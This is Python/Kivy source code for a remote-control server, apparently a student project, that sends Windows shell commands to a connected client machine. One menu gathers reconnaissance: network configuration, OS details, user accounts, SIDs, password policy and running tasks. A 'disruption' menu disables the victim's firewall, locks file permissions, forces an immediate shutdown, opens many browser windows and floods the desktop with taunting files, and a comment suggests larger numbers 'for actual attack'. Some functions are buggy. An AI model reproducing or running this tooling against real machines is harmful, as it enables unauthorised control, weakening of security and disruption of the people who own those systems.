import os
import socket
import threading
import sys
from functools import partial

import kivy
import kivymd
from kivymd.app import MDApp
from kivy.lang import Builder
from kivymd.uix.screen import Screen
from kivymd.uix.dialog import MDDialog
from kivy.uix.boxlayout import BoxLayout
from kivymd.uix.button import MDFlatButton

KV = '''
ScreenManager:
    id: screenManager
    MDScreen:
        name: "startMenu"
        MDRectangleFlatButton:
            id: startBtn
            text: "Start Server"
            pos_hint: {"center_x": .5, "center_y": .5}
            opacity: 1
            disabled: False
            on_press: app.StartServer()
        MDLabel:
            id: statusLbl
            text: "Status"
            font_size: '22.5sp'
            halign: 'center'
            size_hint_y: None
            height: self.texture_size[1]
            padding_y: "500"
            
    MDScreen:
        name: "mainMenu"            
        ScrollView:
            MDList:
                OneLineListItem:
                    id: networkInfoBtn
                    text: "Network Info"
                    on_press: app.NetworkInfo()

                OneLineListItem:
                    id: osInfoBtn
                    text: "OS Info"
                    on_press: app.OSInfo()

                OneLineListItem:
                    id: cpuBtn
                    text: "CPU Usage"
                    on_press: app.CpuUsage()

                OneLineListItem:
                    id: taskBtn
                    text: "Task List"
                    on_press: app.Tasks()

                OneLineListItem:
                    id: netserviceBtn
                    text: "Network Services"
                    on_press: app.Services()

                OneLineListItem:
                    id: userInfoBtn
                    text: "User Information"
                    on_press: app.UserInfo()

                OneLineListItem:
                    id: secPolicy
                    text: "Security Policy"
                    on_press: app.SecPolicy()

                OneLineListItem:
                    id: memInfo
                    text: "Memory Information"
                    on_press: app.MemInfo()

        MDTextField:
            id: consoleField
            hint_text: 'Console'
            multiline: True

        MDIconButton:
            icon: "spider-thread"
            md_bg_color: 'red'
            pos_hint: {"center_x": .95, "center_y": .1} 
            elevation_normal: 12
            on_press: app.DisruptionMenu()


    MDScreen:
        name: "disruptionMenu"
        ScrollView:
            MDList:
                OneLineListItem:
                    id: killTaskBtn
                    text: "Kill Task"
                    on_press: app.KillTask()
                    
                OneLineListItem:
                    id: shutDownBtn
                    text: "Shutdown"
                    on_press: app.Shutdown()
                    
                OneLineListItem:
                    id: fileCreateBtn
                    text: "File Creation Disruption"
                    on_press: app.FileCreate()
                    
                OneLineListItem:
                    id: firewallBtn
                    text: "Firewall"
                    on_press: app.Firewall()

                OneLineListItem:
                    id: denyFileBtn
                    text: "Deny Files"
                    on_press: app.DenyFiles()
                    
                OneLineListItem:
                    id: openBrowser
                    text: "Open Browsers"
                    on_press: app.OpenBrowsers()

        MDTextField:
            id: consoleField
            hint_text: 'Console'
            multiline: True

        MDIconButton:
            icon: "menu"
            md_bg_color: 'lightblue'
            pos_hint: {"center_x": .95, "center_y": .1} 
            elevation_normal: 12
            on_press: app.MainMenu()

<TaskKillContent>
    orientation: 'vertical'
    spacing: '12dp'
    size_hint_y: None
    height: '120dp'

    MDTextField:
        hint_text: 'Enter Process Name'
        
'''

class Main(MDApp):
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "BlueGray"

        return Builder.load_string(KV)

    def StartServer(self):
        # Server IP and Port
        HOST = '127.0.0.1'  # Temporary localhost for testing (Make sure to use the client's IP during production
        PORT = 21420

        # Start server with the given host and port given and listen for a client
        self.server = socket.socket()
        self.server.bind((HOST, PORT))
        self.root.ids.statusLbl.text = 'Server started!'
        # print('Server started!')

        # A max of one client can be listend at a time
        self.server.listen(1)
        self.root.ids.statusLbl.text = 'Listening for a client connection to be established...'
        # print('Listening for a client connection to be established...')
        self.root.ids.startBtn.disabled = True
        self.root.ids.startBtn.opacity = 0
        threading.Thread(target=self.MainLoop).start()

    def MainLoop(self):
        while True:
            # Check whether connection is established
            self.currConn = self.server.accept()[0]
            self.root.ids.statusLbl.text = 'A client connected!'
            self.root.current = "mainMenu"
            print('A client has established connection!')

    # Juls shizzle
    # This is to gather the client's information about their network
    def NetworkInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Send command to the client
            command = 'ipconfig /all'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # Receive the output given from the client
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Gather Operating System Information
    def OSInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get Host/Machine Name
            command = 'systeminfo | findstr /C:"Hostname"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Get OS Information
            command = 'systeminfo | findstr /C:"OS"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize)).decode()

            #Get Processor Information
            command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize2)).decode()

            # Print results
            print('Output: \n')
            print(output)
            print(output2)
            print(output3)
            break

    def GpuInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get GPU Name
            command = 'wmic path win32_VideoController get name'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()

            # Get GPU Description
            command = 'wmic path win32_VideoController get Description'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()

            # Get GPU Version
            command = 'wmic path win32_VideoController get DriverVersion'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize2)).decode()

            # Print results
            print('Output: \n')
            print(output)
            print(output2)
            print(output3)
            break

    # Zees stuff
    # Get the % of CPU Utilization
    def CpuUsage(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'wmic cpu get loadpercentage'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get current running tasks
    def Tasks(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Send command to client
            command = 'tasklist'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            # Receive output from client
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()  # Still needs more buffer
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get current running services
    def Services(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'net start'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get security policy
    def SecPolicy(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''
            
            command = 'net accounts'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)

            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            self.root.ids.consoleField.text = output
            break

    # Get memory information
    def MemInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Memory status
            command = 'wmic MEMORYCHIP get BankLabel, DeviceLocator, Capacity, Speed'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            
            # Available memory
            command = 'systeminfo | findstr /C:"Available Physical Memory"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()
            # Cache
            command = 'wmic cpu get L2CacheSize, L3CacheSize'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize3 = self.currConn.recv(1024).decode()
            output3 = self.currConn.recv(int(recvsize3)).decode()

            # Print result
            print('Output: \n')
            print(output)
            print(output2)
            print(output3)
            break

    # Fang's stuffz
    def UserInfo(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # Get Username, Fullname, Last Login
            command = 'net user "%USERNAME%"'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            output = output.splitlines()

            # Get SID
            command = 'wmic useraccount where name="%USERNAME%" get sid'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize2 = self.currConn.recv(1024).decode()
            output2 = self.currConn.recv(int(recvsize2)).decode()
            output2 = output2.splitlines()

            # Print results
            print('Output: ')
            print(f"{output[0]}\n{output[1]}\n{output[8]}")
            print(f"SID\t\t\t\t\t\t\t{output2[2]}")
            break

    ###############################DISRUPTIONS############################################
    # Juls Simple Disruption
    # Disable Firewall Disruption
    def Firewall(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = "netsh advfirewall set allprofiles state off"
            self.currConn.send(command.encode())
            print('[+] Command sent')
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print(f"Output: {output}")
            self.root.ids.consoleField.text = output
            break

    # Prevent access to file
    def DenyFiles(self):
        while True:
            command = 'cacls "C:\\Users\\%USERNAME%\\Desktop\\Test" /E /P everyone:n'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            recvsize = self.currConn.recv(1024).decode()
            output = self.currConn.recv(int(recvsize)).decode()
            print('Output: ', output)
            break

    # Juls Severe Disruption
    # Open many browsers
    def OpenBrowsers(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            command = 'FOR /L %A IN (1 1 20) DO (start msedge)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            self.root.ids.consoleField.text = command
            break

    # Zees Severe Disruption
    # File Creation Disruption
    def FileCreate(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''
            # Replace 20 with a larger number for actual attack
            command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            self.root.ids.consoleField.text = command
            break

    # Zees Simple Disruptions
    # Shutdown Disruption
    def Shutdown(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            # /t is Timer
            command = 'shutdown /s /t 00'
            self.currConn.send(command.encode())
            print('Command sent to client: ', command)
            self.root.ids.consoleField.text = command
            break

    #Kill Task Disruption
    def KillTask(self):
        while True:
            # Reset console
            self.root.ids.consoleField.text = ''

            self.killTaskDialog = MDDialog()            
            tkCancelBtn = MDFlatButton(text = "CANCEL", on_press = self.killTaskDialog.close())
            self.root.ids['tkCancel'] = tkCancelBtn
            
            tkAcceptBtn = MDFlatButton(Text = "OK")
            self.root.ids['tkAccept'] = tkAcceptBtn
            
            self.killTaskDialog = MDDialog(
                title = "Task Kill:",
                type = "custom",
                content_cls = TaskKillContent(),
                buttons = [tkCancelBtn, tkAcceptBtn,],)
            self.killTaskDialog.open()

            #self.root.ids.tkCancelBtn.on_press = partial(self.killTaskDialog.close())
            
            # procname = input('Enter Process Name: ')
##            command = 'taskkill /im explorer.exe /F'
##            self.currConn.send(command.encode())
##            print('Command sent to client: ', command)
##            output = self.currConn.recv(8096).decode()
##            print('Output: ', output)
##            self.root.ids.consoleField.text = output
            break

    def DisruptionMenu(self):
        self.root.current = "disruptionMenu"

    def MainMenu(self):
        self.root.current = "mainMenu"


class TaskKillContent(BoxLayout):
    pass

if __name__ == '__main__':
    Main().run()
